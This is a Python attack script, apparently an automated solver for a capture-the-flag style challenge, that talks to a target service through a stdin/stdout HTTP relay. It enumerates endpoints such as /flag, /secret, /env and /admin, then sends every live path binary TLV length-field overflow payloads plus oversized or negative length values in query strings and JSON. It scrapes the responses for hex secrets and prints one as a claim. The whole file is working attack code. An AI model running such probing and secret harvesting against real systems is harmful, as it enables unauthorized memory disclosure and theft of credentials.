import sys, json, base64, re

def req(method, path, headers=None, body=None, body_hex=None):
    m = {"http": {"method": method, "path": path}}
    if headers: m["http"]["headers"] = headers
    if body_hex is not None: m["http"]["body_hex"] = body_hex
    elif body is not None: m["http"]["body"] = body
    sys.stdout.write(json.dumps(m) + "\n"); sys.stdout.flush()
    line = sys.stdin.readline()
    if not line: return None
    try: r = json.loads(line)
    except Exception: return None
    b = r.get("body_b64")
    if b:
        try:
            raw = base64.b64decode(b)
            r["text"] = raw.decode("utf-8", "replace")
            r["raw"] = raw.hex()
        except Exception: pass
    return r

log = []
cands = set()

# stage 1: discover live endpoint
alive = []
wide = ["/parse","/records","/record","/upload","/ingest","/submit","/data","/v1/parse",
"/health","/healthz","/status","/api","/api/parse","/api/v1/parse","/process",
"/msg","/message","/packets","/frame","/tlv","/proto","/protocol","/binary",
"/blob","/read","/decode","/echo","/test","/hello","/ping","/session",
"/dump","/debug","/info","/version","/source","/flag","/secret","/env",
"/config","/admin","/log","/logs","/rpc","/query","/search","/index",
"/list","/get","/post","/store","/save","/put","/json","/xml","/csv",
"/report","/event","/events","/log_event","/collect","/ingestion","/feed",
"/socket","/ws","/stream","/batch","/bulk","/cmd","/exec","/run"]
for p in wide:
    r = req("GET", p)
    if r is None: continue
    st = r.get("status")
    if st != 404:
        alive.append((p, st, r.get("content_type"), str(r.get("text"))[:400]))
        for m in re.findall(r"[0-9a-fA-F]{24,}", str(r.get("text","")) + str(r.get("raw",""))):
            cands.add(m)
log.append(("ALIVE", alive))

# stage 2: attack each live path with TLV / length-field overflow payloads
tlv = b"\x00\x01\x00\x04test"
cands2 = set()
payloads = [
    b"\xff\xff\xff\xff" + b"A"*8,
    b"\xff\xff\xff\xff" + b"A"*64,
    b"\xff\xff\xff\xff" + b"A"*256,
    b"\x7f\xff\xff\xff" + b"A"*64,
    b"\xff\xff\xff\xff\x00\x00\x00\x00" + b"A"*32,
    b"\x00\x00\xff\xff" + b"A"*16,
    b"\xff\xff" + b"A"*8,
    b"\x00\x00\x00\x00\x00\x00\x01\xf4" + b"A"*500,
    b"\xff"*4 + b"A"*16,
    b"\x00\x00\x80\x3f" + b"A"*16,
    b"\x00\x00\x00\x00\xff\xff\xff\xff" + b"A"*8,
    b"\x00\x00\xff\xff\x41\x41\x41\x41",
    b"\x04\x00\x00\x00TEST" + b"\xff\xff\xff\xff",
    b"\xff\xff\xff\xff",
    b"\x7f\xff\xff\xff" * 4 + b"A"*32,
    b"\x00\x00\x00\x01" + b"\x00"*4 + b"A"*4096,
    b"\xff"*8 + b"A"*8,
    b"\x00"*4 + b"\xff\xff\xff\x7f" + b"A"*8,
    b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01",
    b"\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
]
for p, st, ct, tx in alive:
    for i, pb in enumerate(payloads):
        r = req("POST", p, body_hex=pb.hex(), headers={"Content-Type": "application/octet-stream"})
        if r is None: continue
        body = str(r.get("text","")) + str(r.get("raw",""))
        log.append((p, "octet", i, r.get("status"), body[:400]))
        for m in re.findall(r"[0-9a-fA-F]{24,}", body):
            cands2.add(m)
        for m in re.findall(r"(?i)secret[\"' :=]+([0-9a-fA-F]{16,})", body):
            cands2.add(m)
    # query-param variant
    for q in ["?len=99999999999", "?size=99999999999", "?count=-1", "?n=0xffffffff", "?length=-1"]:
        r = req("GET", p + q)
        if r is None: continue
        body = str(r.get("text","")) + str(r.get("raw",""))
        log.append((p, q, r.get("status"), body[:300]))
        for m in re.findall(r"[0-9a-fA-F]{24,}", body):
            cands2.add(m)
    # json body variant
    for jb in ['{"len":99999999999}', '{"length":99999999999}', '{"size":-1}', '{"count":4294967295}', '{"data":"AAAA","length":9999999999}']:
        r = req("POST", p, body=jb, headers={"Content-Type": "application/json"})
        if r is None: continue
        body = str(r.get("text","")) + str(r.get("raw",""))
        log.append((p, jb, r.get("status"), body[:300]))
        for m in re.findall(r"[0-9a-fA-F]{24,}", body):
            cands2.add(m)

allc = cands | cands2
sys.stderr.write(json.dumps(log)[:12000] + "\n")
sys.stderr.write("CANDS=" + json.dumps(sorted(allc)) + "\n")

# prefer longest candidate that is not pure json-ascii noise
best = ""
for c in sorted(allc, key=len, reverse=True):
    low = c.lower()
    try:
        if bytes.fromhex(c).decode("utf-8").strip().startswith("{"): continue
    except Exception: pass
    if len(set(low)) < 4: continue
    best = c
    break
print('CLAIM:{"secret_hex": "' + best + '"}', flush=True)